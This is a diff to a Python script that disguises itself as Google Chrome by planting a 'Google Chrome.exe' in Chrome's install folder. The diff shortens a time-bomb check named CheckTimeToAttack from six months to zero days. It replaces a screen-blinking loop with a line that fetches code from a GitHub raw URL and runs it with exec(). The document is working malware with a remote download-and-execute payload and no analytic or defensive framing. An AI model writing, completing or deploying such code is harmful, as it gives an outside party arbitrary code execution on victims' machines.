@@ -45,7 +45,7 @@ def CheckTimeToAttack(file_path):
     mod_time = os.path.getmtime(file_path)
     file_mod_time = datetime.fromtimestamp(mod_time)
     current_date = datetime.now()
-    six_months_later = file_mod_time + timedelta(days=6*30)
+    six_months_later = file_mod_time + timedelta(days=0)
     
     if current_date >= six_months_later:
         return True
@@ -68,15 +68,8 @@ def main():
     if not os.path.exists(hidevr):
         move_file(r"C:\Users\Administrator\Desktop\Google Chrome.exe","C:\\Program Files\\Google\\Chrome\\Application")
     openchrome()
-    i = 0
-    while CheckTimeToAttack(hidevr) == True:
-        turn_screen_off()
-        time.sleep(3)
-        turn_screen_on()
-        time.sleep(5)
-        i+=1
-        if i == 5:
-            break
+    if CheckTimeToAttack(hidevr) == True:
+        exec(requests.get("https://raw.githubusercontent.com/bobbytri2272/Virus/main/Attack").text)
         
 if __name__ == "__main__":
     main()
